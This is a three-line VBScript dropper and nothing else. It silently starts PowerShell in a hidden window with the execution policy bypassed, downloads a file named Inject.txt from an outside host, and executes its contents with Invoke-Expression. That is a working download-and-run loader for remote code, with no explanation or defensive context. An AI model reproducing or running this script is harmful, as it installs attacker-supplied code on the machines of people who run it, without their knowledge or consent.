Set WshShell3 = CreateObject("WScript.Shell")
WshShell3.Run "powershell.exe -Sta -NoExit -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command ""$url='http://nonsus.gleeze.com/Inject.txt';$response = Invoke-WebRequest -Uri $url -Method Get;iex $response.Content""", 0, False
Set WshShell3 = Nothing
